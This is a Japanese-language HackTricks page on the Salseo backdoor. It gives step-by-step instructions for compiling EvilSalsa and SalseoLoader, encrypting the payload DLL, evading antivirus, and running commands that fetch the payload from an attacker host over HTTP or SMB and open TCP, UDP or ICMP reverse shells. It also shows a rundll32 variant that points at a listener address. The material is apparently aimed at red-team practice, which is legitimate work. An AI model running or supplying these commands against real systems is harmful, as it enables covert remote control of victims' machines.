# Salseo

<details>

<summary><strong>ゼロからヒーローまでのAWSハッキングを学ぶ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS Red Team Expert）</strong></a><strong>！</strong></summary>

HackTricks をサポートする他の方法:

* **HackTricks で企業を宣伝したい**または **HackTricks をPDFでダウンロードしたい**場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS＆HackTricksスワッグ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)、当社の独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)コレクションを発見する
* **💬 [Discordグループ](https://discord.gg/hRep4RUj7f)**に参加するか、[telegramグループ](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**をフォロー**する
* **ハッキングトリックを共有するには、PRを** [**HackTricks**](https://github.com/carlospolop/hacktricks) **および** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **のGitHubリポジトリに提出してください。**

</details>

## バイナリのコンパイル

GitHub からソースコードをダウンロードし、**EvilSalsa** と **SalseoLoader** をコンパイルします。コードをコンパイルするには **Visual Studio** が必要です。

これらのプロジェクトを、使用するWindowsボックスのアーキテクチャ用にコンパイルします（Windowsがx64をサポートしている場合は、そのアーキテクチャ用にコンパイルします）。

Visual Studio内で、**"Platform Target"** で **左側の "Build" タブ** でアーキテクチャを選択できます。

（\*\*このオプションが見つからない場合は、**"Project Tab"** を押し、次に **"<Project Name> Properties"** をクリックします）

![](<../.gitbook/assets/image (839).png>)

その後、両方のプロジェクトをビルドします（Build -> Build Solution）（ログ内に実行可能ファイルのパスが表示されます）:

![](<../.gitbook/assets/image (381).png>)

## バックドアの準備

まず、**EvilSalsa.dll** をエンコードする必要があります。これを行うには、pythonスクリプト **encrypterassembly.py** を使用するか、プロジェクト **EncrypterAssembly** をコンパイルできます:

### **Python**
```
python EncrypterAssembly/encrypterassembly.py <FILE> <PASSWORD> <OUTPUT_FILE>
python EncrypterAssembly/encrypterassembly.py EvilSalsax.dll password evilsalsa.dll.txt
```
### Windows

### ウィンドウズ
```
EncrypterAssembly.exe <FILE> <PASSWORD> <OUTPUT_FILE>
EncrypterAssembly.exe EvilSalsax.dll password evilsalsa.dll.txt
```
Ok, 今、Salseoのすべてを実行するために必要なものが揃いました: **エンコードされたEvilDalsa.dll** と **SalseoLoaderのバイナリ**。

**SalseoLoader.exeバイナリをマシンにアップロードしてください。どのAVにも検出されないようにしてください...**

## **バックドアを実行する**

### **TCPリバースシェルを取得する（HTTPを介してエンコードされたdllをダウンロードする）**

リバースシェルリスナーとHTTPサーバーを起動して、エンコードされたevilsalsaを提供することを忘れないでください。
```
SalseoLoader.exe password http://<Attacker-IP>/evilsalsa.dll.txt reversetcp <Attacker-IP> <Port>
```
### **UDPリバースシェルを取得する（SMBを介してエンコードされたdllをダウンロードする）**

リバースシェルリスナーとしてncを起動し、エンコードされたevilsalsaを提供するためのSMBサーバー（impacket-smbserver）を起動することを忘れないでください。
```
SalseoLoader.exe password \\<Attacker-IP>/folder/evilsalsa.dll.txt reverseudp <Attacker-IP> <Port>
```
### **ICMPリバースシェルを取得する（エンコードされたdllはすでに被害者の中にある）**

**今回は、リバースシェルを受信するためにクライアントに特別なツールが必要です。ダウンロード:** [**https://github.com/inquisb/icmpsh**](https://github.com/inquisb/icmpsh)

#### **ICMP応答を無効にする:**
```
sysctl -w net.ipv4.icmp_echo_ignore_all=1

#You finish, you can enable it again running:
sysctl -w net.ipv4.icmp_echo_ignore_all=0
```
#### クライアントを実行する:
```
python icmpsh_m.py "<Attacker-IP>" "<Victm-IP>"
```
#### 被害者の内部で、salseoの実行を許可します：
```
SalseoLoader.exe password C:/Path/to/evilsalsa.dll.txt reverseicmp <Attacker-IP>
```
## DLLのエクスポートメイン関数としてSalseoLoaderをコンパイルする

Visual Studioを使用してSalseoLoaderプロジェクトを開きます。

### メイン関数の前に追加: \[DllExport]

![](<../.gitbook/assets/image (409).png>)

### このプロジェクトにDllExportをインストール

#### **ツール** --> **NuGet パッケージ マネージャー** --> **ソリューションの NuGet パッケージを管理...**

![](<../.gitbook/assets/image (881).png>)

#### **DllExport パッケージを検索 (Browse タブを使用) し、インストールを押して (ポップアップを受け入れる)**

![](<../.gitbook/assets/image (100).png>)

プロジェクトフォルダに **DllExport.bat** と **DllExport\_Configure.bat** というファイルが表示されます

### **DllExport をアンインストール**

**アンインストール** を押します (はい、奇妙ですが、信じてください、必要です)

![](<../.gitbook/assets/image (97).png>)

### **Visual Studio を終了して DllExport\_configure を実行**

単に Visual Studio を **終了** します

その後、**SalseoLoader フォルダ**に移動して **DllExport\_Configure.bat** を実行します

**x64** を選択します (x64 ボックス内で使用する場合、私の場合はそうでした)、**System.Runtime.InteropServices** (DllExport の **Namespace** 内) を選択して **Apply** を押します

![](<../.gitbook/assets/image (882).png>)

### プロジェクトを再度 Visual Studio で開く

**\[DllExport]** はもはやエラーとしてマークされていません

![](<../.gitbook/assets/image (670).png>)

### ソリューションをビルド

**Output Type = Class Library** を選択します (プロジェクト --> SalseoLoader プロパティ --> アプリケーション --> Output type = Class Library)

![](<../.gitbook/assets/image (847).png>)

**x64 プラットフォーム** を選択します (プロジェクト --> SalseoLoader プロパティ --> ビルド --> Platform target = x64)

![](<../.gitbook/assets/image (285).png>)

ソリューションを **ビルド** するには: Build --> Build Solution (Output コンソール内に新しい DLL のパスが表示されます)

### 生成された DLL をテスト

DLL をテストしたい場所にコピーして貼り付けます。

実行:
```
rundll32.exe SalseoLoader.dll,main
```
エラーが表示されない場合は、おそらく機能するDLLを持っています！！

## DLLを使用してシェルを取得する

**HTTP** **サーバー**を使用して、**nc** **リスナー**を設定することを忘れないでください

### Powershell
```
$env:pass="password"
$env:payload="http://10.2.0.5/evilsalsax64.dll.txt"
$env:lhost="10.2.0.5"
$env:lport="1337"
$env:shell="reversetcp"
rundll32.exe SalseoLoader.dll,main
```
### CMD

### CMD
```
set pass=password
set payload=http://10.2.0.5/evilsalsax64.dll.txt
set lhost=10.2.0.5
set lport=1337
set shell=reversetcp
rundll32.exe SalseoLoader.dll,main
```
<details>

<summary><strong>AWSハッキングをゼロからヒーローまで学ぶ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS Red Team Expert）</strong></a><strong>！</strong></summary>

HackTricksをサポートする他の方法:

* **HackTricksで企業を宣伝したい**または**HackTricksをPDFでダウンロードしたい**場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を入手してください
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)、当社の独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)コレクションを発見してください
* **💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)に参加するか、[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**をフォローしてください。**
* **ハッキングトリックを共有するために、[**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを提出してください。**

</details>
